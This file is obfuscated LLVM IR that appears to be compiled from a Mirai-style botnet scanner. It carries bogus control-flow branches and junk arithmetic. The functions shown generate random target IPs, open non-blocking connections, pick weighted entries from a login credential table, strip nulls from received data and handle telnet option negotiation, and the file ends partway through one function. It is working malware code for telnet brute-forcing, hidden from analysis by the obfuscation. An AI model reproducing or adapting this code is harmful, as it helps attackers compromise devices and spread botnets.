  %5743 = icmp slt i32 %5742, 175
  br label %originalBB594

originalBB598alteredBB:                           ; preds = %originalBB598, %4359
  %5744 = load i8, i8* %2, align 1
  %5745 = zext i8 %5744 to i32
  %5746 = icmp eq i32 %5745, 208
  br label %originalBB598

originalBB602alteredBB:                           ; preds = %originalBB602, %4407
  %5747 = load i8, i8* %2, align 1
  %5748 = zext i8 %5747 to i32
  %5749 = icmp eq i32 %5748, 66
  br label %originalBB602

originalBB606alteredBB:                           ; preds = %originalBB606, %4427
  %5750 = load i8, i8* %3, align 1
  %5751 = zext i8 %5750 to i32
  %5752 = icmp eq i32 %5751, 71
  br label %originalBB606

originalBB610alteredBB:                           ; preds = %originalBB610, %4467
  %5753 = load i8, i8* %4, align 1
  %5754 = zext i8 %5753 to i32
  %5755 = icmp slt i32 %5754, 223
  br label %originalBB610

originalBB614alteredBB:                           ; preds = %originalBB614, %4487
  %5756 = load i8, i8* %2, align 1
  %5757 = zext i8 %5756 to i32
  %5758 = icmp eq i32 %5757, 107
  br label %originalBB614

originalBB618alteredBB:                           ; preds = %originalBB618, %4507
  %5759 = load i8, i8* %3, align 1
  %5760 = zext i8 %5759 to i32
  %5761 = icmp sge i32 %5760, 20
  br label %originalBB618

originalBB622alteredBB:                           ; preds = %originalBB622, %4527
  %5762 = load i8, i8* %3, align 1
  %5763 = zext i8 %5762 to i32
  %5764 = icmp slt i32 %5763, 24
  br label %originalBB622

originalBB626alteredBB:                           ; preds = %originalBB626, %4547
  %5765 = load i8, i8* %2, align 1
  %5766 = zext i8 %5765 to i32
  %5767 = icmp eq i32 %5766, 35
  br label %originalBB626

originalBB630alteredBB:                           ; preds = %originalBB630, %4567
  %5768 = load i8, i8* %3, align 1
  %5769 = zext i8 %5768 to i32
  %5770 = icmp sge i32 %5769, 159
  br label %originalBB630

originalBB634alteredBB:                           ; preds = %originalBB634, %4591
  %5771 = load i8, i8* %2, align 1
  %5772 = zext i8 %5771 to i32
  %5773 = icmp eq i32 %5772, 52
  br label %originalBB634

originalBB638alteredBB:                           ; preds = %originalBB638, %4611
  %5774 = load i8, i8* %3, align 1
  %5775 = zext i8 %5774 to i32
  %5776 = icmp sge i32 %5775, 1
  br label %originalBB638

originalBB642alteredBB:                           ; preds = %originalBB642, %4651
  %5777 = load i8, i8* %3, align 1
  %5778 = zext i8 %5777 to i32
  %5779 = icmp sge i32 %5778, 64
  br label %originalBB642

originalBB646alteredBB:                           ; preds = %originalBB646, %4671
  %5780 = load i8, i8* %3, align 1
  %5781 = zext i8 %5780 to i32
  %5782 = icmp slt i32 %5781, 95
  br label %originalBB646

originalBB650alteredBB:                           ; preds = %originalBB650, %4699
  %5783 = load i8, i8* %3, align 1
  %5784 = zext i8 %5783 to i32
  %5785 = icmp slt i32 %5784, 255
  br label %originalBB650

originalBB654alteredBB:                           ; preds = %originalBB654, %4719
  %5786 = load i8, i8* %2, align 1
  %5787 = zext i8 %5786 to i32
  %5788 = icmp eq i32 %5787, 13
  br label %originalBB654

originalBB658alteredBB:                           ; preds = %originalBB658, %4739
  %5789 = load i8, i8* %3, align 1
  %5790 = zext i8 %5789 to i32
  %5791 = icmp sge i32 %5790, 52
  br label %originalBB658

originalBB662alteredBB:                           ; preds = %originalBB662, %4759
  %5792 = load i8, i8* %3, align 1
  %5793 = zext i8 %5792 to i32
  %5794 = icmp slt i32 %5793, 60
  br label %originalBB662

originalBB666alteredBB:                           ; preds = %originalBB666, %4779
  %5795 = load i8, i8* %2, align 1
  %5796 = zext i8 %5795 to i32
  %5797 = icmp eq i32 %5796, 13
  br label %originalBB666

originalBB670alteredBB:                           ; preds = %originalBB670, %4823
  %5798 = load i8, i8* %3, align 1
  %5799 = zext i8 %5798 to i32
  %5800 = icmp slt i32 %5799, 255
  br label %originalBB670

originalBB674alteredBB:                           ; preds = %originalBB674, %4851
  %5801 = load i8, i8* %4, align 1
  %5802 = zext i8 %5801 to i32
  %5803 = icmp sge i32 %5802, 128
  br label %originalBB674

originalBB678alteredBB:                           ; preds = %originalBB678, %4871
  %5804 = load i8, i8* %4, align 1
  %5805 = zext i8 %5804 to i32
  %5806 = icmp slt i32 %5805, 255
  br label %originalBB678

originalBB682alteredBB:                           ; preds = %originalBB682, %4895
  %5807 = load i8, i8* %3, align 1
  %5808 = zext i8 %5807 to i32
  %5809 = icmp eq i32 %5808, 47
  br label %originalBB682

originalBB686alteredBB:                           ; preds = %originalBB686, %4915
  %5810 = load i8, i8* %4, align 1
  %5811 = zext i8 %5810 to i32
  %5812 = icmp sge i32 %5811, 224
  br label %originalBB686

originalBB690alteredBB:                           ; preds = %originalBB690, %4935
  %5813 = load i8, i8* %4, align 1
  %5814 = zext i8 %5813 to i32
  %5815 = icmp slt i32 %5814, 255
  br label %originalBB690

originalBB694alteredBB:                           ; preds = %originalBB694, %4959
  %5816 = load i8, i8* %3, align 1
  %5817 = zext i8 %5816 to i32
  %5818 = icmp eq i32 %5817, 34
  br label %originalBB694

originalBB698alteredBB:                           ; preds = %originalBB698, %4983
  %5819 = load i8, i8* %4, align 1
  %5820 = zext i8 %5819 to i32
  %5821 = icmp slt i32 %5820, 97
  br label %originalBB698

originalBB702alteredBB:                           ; preds = %originalBB702, %5011
  %5822 = load i8, i8* %3, align 1
  %5823 = zext i8 %5822 to i32
  %5824 = icmp slt i32 %5823, 231
  br label %originalBB702

originalBB706alteredBB:                           ; preds = %originalBB706, %5039
  %5825 = load i8, i8* %3, align 1
  %5826 = zext i8 %5825 to i32
  %5827 = icmp slt i32 %5826, 109
  br label %originalBB706

originalBB710alteredBB:                           ; preds = %originalBB710, %5063
  %5828 = load i8, i8* %3, align 1
  %5829 = zext i8 %5828 to i32
  %5830 = icmp sge i32 %5829, 62
  br label %originalBB710

originalBB714alteredBB:                           ; preds = %originalBB714, %5083
  %5831 = load i8, i8* %3, align 1
  %5832 = zext i8 %5831 to i32
  %5833 = icmp slt i32 %5832, 63
  br label %originalBB714

originalBB718alteredBB:                           ; preds = %originalBB718, %5119
  %5834 = load i8, i8* %3, align 1
  %5835 = zext i8 %5834 to i32
  %5836 = icmp sge i32 %5835, 245
  br label %originalBB718

originalBB722alteredBB:                           ; preds = %originalBB722, %5171
  %5837 = load i8, i8* %2, align 1
  %5838 = zext i8 %5837 to i32
  %5839 = icmp eq i32 %5838, 193
  br label %originalBB722

originalBB726alteredBB:                           ; preds = %originalBB726, %5203
  %5840 = load i8, i8* %3, align 1
  %5841 = zext i8 %5840 to i32
  %5842 = icmp slt i32 %5841, 108
  br label %originalBB726

originalBB730alteredBB:                           ; preds = %originalBB730, %5227
  %5843 = load i8, i8* %3, align 1
  %5844 = zext i8 %5843 to i32
  %5845 = icmp eq i32 %5844, 68
  br label %originalBB730

originalBB734alteredBB:                           ; preds = %originalBB734, %5261
  %5846 = load i8, i8* %2, align 1
  %5847 = zext i8 %5846 to i32
  %_ = sub i32 0, %5847
  %gen = add i32 %_, 24
  %_735 = shl i32 %5847, 24
  %5848 = shl i32 %5847, 24
  %5849 = load i8, i8* %3, align 1
  %5850 = zext i8 %5849 to i32
  %_736 = sub i32 0, %5850
  %gen737 = add i32 %_736, 16
  %5851 = shl i32 %5850, 16
  %_738 = shl i32 %5848, %5851
  %_739 = shl i32 %5848, %5851
  %_740 = sub i32 0, %5848
  %gen741 = add i32 %_740, %5851
  %_742 = sub i32 0, %5848
  %gen743 = add i32 %_742, %5851
  %_744 = sub i32 %5848, %5851
  %gen745 = mul i32 %_744, %5851
  %_746 = shl i32 %5848, %5851
  %5852 = or i32 %5848, %5851
  %5853 = load i8, i8* %4, align 1
  %5854 = zext i8 %5853 to i32
  %_747 = sub i32 0, %5854
  %gen748 = add i32 %_747, 8
  %_749 = sub i32 %5854, 8
  %gen750 = mul i32 %_749, 8
  %_751 = shl i32 %5854, 8
  %_752 = shl i32 %5854, 8
  %5855 = shl i32 %5854, 8
  %_753 = sub i32 0, %5852
  %gen754 = add i32 %_753, %5855
  %_755 = shl i32 %5852, %5855
  %_756 = sub i32 0, %5852
  %gen757 = add i32 %_756, %5855
  %_758 = shl i32 %5852, %5855
  %5856 = or i32 %5852, %5855
  %5857 = load i8, i8* %5, align 1
  %5858 = zext i8 %5857 to i32
  %_759 = sub i32 %5858, 0
  %gen760 = mul i32 %_759, 0
  %_761 = sub i32 0, %5858
  %gen762 = add i32 %_761, 0
  %_763 = sub i32 %5858, 0
  %gen764 = mul i32 %_763, 0
  %5859 = shl i32 %5858, 0
  %_765 = shl i32 %5856, %5859
  %5860 = or i32 %5856, %5859
  %5861 = call i32 @htonl(i32 %5860) #7
  br label %originalBB734
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %31

; <label>:10:                                     ; preds = %1
  %11 = load i32, i32* @x.59
  %12 = load i32, i32* @y.60
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 1
  %21 = load i32, i32* %20, align 8
  %22 = call i32 @close(i32 %21)
  %23 = load i32, i32* @x.59
  %24 = load i32, i32* @y.60
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %31

; <label>:31:                                     ; preds = %originalBBpart2, %1
  %32 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %33 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %34 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %33, i32 0, i32 1
  store i32 %32, i32* %34, align 8
  %35 = icmp eq i32 %32, -1
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %31
  %37 = load i32, i32* @x.59
  %38 = load i32, i32* @y.60
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  %45 = load i32, i32* @x.59
  %46 = load i32, i32* @y.60
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %91

; <label>:53:                                     ; preds = %31
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 6
  store i32 0, i32* %55, align 4
  %56 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %56, i32 0, i32 7
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %57, i32 0, i32 0
  call void @util_zero(i8* %58, i32 256)
  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %60 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i32 0, i32 1
  %61 = load i32, i32* %60, align 8
  %62 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 1
  %64 = load i32, i32* %63, align 8
  %65 = call i32 (i32, i32, ...) @fcntl(i32 %64, i32 3, i32 0)
  %66 = or i32 2048, %65
  %67 = call i32 (i32, i32, ...) @fcntl(i32 %61, i32 4, i32 %66)
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %68, align 4
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 4
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %73 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %72, i32 0, i32 0
  store i32 %71, i32* %73, align 4
  %74 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %74, i32 0, i32 5
  %76 = load i16, i16* %75, align 8
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %76, i16* %77, align 2
  %78 = load i32, i32* @fake_time, align 4
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 2
  store i32 %78, i32* %80, align 4
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 3
  store i32 1, i32* %82, align 8
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %84 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %83, i32 0, i32 1
  %85 = load i32, i32* %84, align 8
  %86 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %87 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %87, %struct.sockaddr** %86, align 8
  %88 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %89 = load %struct.sockaddr*, %struct.sockaddr** %88, align 8
  %90 = call i32 @connect(i32 %85, %struct.sockaddr* %89, i32 16)
  br label %91

; <label>:91:                                     ; preds = %53, %originalBBpart24
  %92 = load i32, i32* @x.59
  %93 = load i32, i32* @y.60
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* @x.59
  %101 = load i32, i32* @y.60
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %108 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %109 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i32 0, i32 1
  %110 = load i32, i32* %109, align 8
  %111 = call i32 @close(i32 %110)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  br label %originalBB6
}

declare i32 @select(i32, %struct.fd_set.26*, %struct.fd_set.26*, %struct.fd_set.26*, %struct.timeval.27*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %75, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %78

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %13
  %25 = load i32, i32* @x.61
  %26 = load i32, i32* @y.62
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i32, i32* @x.61
  %34 = load i32, i32* @y.62
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %75

; <label>:41:                                     ; preds = %13
  %42 = load i16, i16* %3, align 2
  %43 = zext i16 %42 to i32
  %44 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %45 = load i32, i32* %2, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %44, i64 %46
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %47, i32 0, i32 3
  %49 = load i16, i16* %48, align 2
  %50 = zext i16 %49 to i32
  %51 = icmp slt i32 %43, %50
  br i1 %51, label %52, label %57

; <label>:52:                                     ; preds = %41
  %53 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %54 = load i32, i32* %2, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %53, i64 %55
  store %struct.scanner_auth* %56, %struct.scanner_auth** %1, align 8
  br label %79

; <label>:57:                                     ; preds = %41
  %58 = load i32, i32* @x.61
  %59 = load i32, i32* @y.62
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i32, i32* @x.61
  %67 = load i32, i32* @y.62
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %74

; <label>:74:                                     ; preds = %originalBBpart24
  br label %75

; <label>:75:                                     ; preds = %74, %originalBBpart2
  %76 = load i32, i32* %2, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %2, align 4
  br label %9

; <label>:78:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %79

; <label>:79:                                     ; preds = %78, %52
  %80 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %80

originalBBalteredBB:                              ; preds = %originalBB, %24
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  br label %originalBB1
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %107

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %originalBBpart217, %20
  %22 = load i32, i32* @x.63
  %23 = load i32, i32* @y.64
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %10, align 4
  %31 = load i32, i32* %9, align 4
  %32 = icmp slt i32 %30, %31
  %33 = load i32, i32* @x.63
  %34 = load i32, i32* @y.64
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %90

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.63
  %43 = load i32, i32* @y.64
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 0
  %57 = load i32, i32* @x.63
  %58 = load i32, i32* @y.64
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %56, label %65, label %70

; <label>:65:                                     ; preds = %originalBBpart24
  %66 = load i8*, i8** %6, align 8
  %67 = load i32, i32* %10, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  store i8 65, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %65, %originalBBpart24
  br label %71

; <label>:71:                                     ; preds = %70
  %72 = load i32, i32* @x.63
  %73 = load i32, i32* @y.64
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i32, i32* %10, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %10, align 4
  %82 = load i32, i32* @x.63
  %83 = load i32, i32* @y.64
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart217, label %originalBB6alteredBB

originalBBpart217:                                ; preds = %originalBB6
  br label %21

; <label>:90:                                     ; preds = %originalBBpart2
  %91 = load i32, i32* @x.63
  %92 = load i32, i32* @y.64
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %90
  %99 = load i32, i32* @x.63
  %100 = load i32, i32* @y.64
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %107

; <label>:107:                                    ; preds = %originalBBpart221, %4
  %108 = load i32, i32* %9, align 4
  ret i32 %108

originalBBalteredBB:                              ; preds = %originalBB, %21
  %109 = load i32, i32* %10, align 4
  %110 = load i32, i32* %9, align 4
  %111 = icmp slt i32 %109, %110
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  %112 = load i8*, i8** %6, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp eq i32 %117, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %119 = load i32, i32* %10, align 4
  %_ = sub i32 0, %119
  %gen = add i32 %_, 1
  %_7 = sub i32 %119, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 %119, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 %119, 1
  %gen12 = mul i32 %_11, 1
  %_13 = shl i32 %119, 1
  %_14 = sub i32 %119, 1
  %gen15 = mul i32 %_14, 1
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %10, align 4
  br label %originalBB6

originalBB19alteredBB:                            ; preds = %originalBB19, %90
  br label %originalBB19
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %originalBBpart227, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %249

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %249

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %231

; <label>:28:                                     ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

; <label>:33:                                     ; preds = %28
  br label %249

; <label>:34:                                     ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %45

; <label>:40:                                     ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = add nsw i32 %43, 2
  store i32 %44, i32* %3, align 4
  br label %11

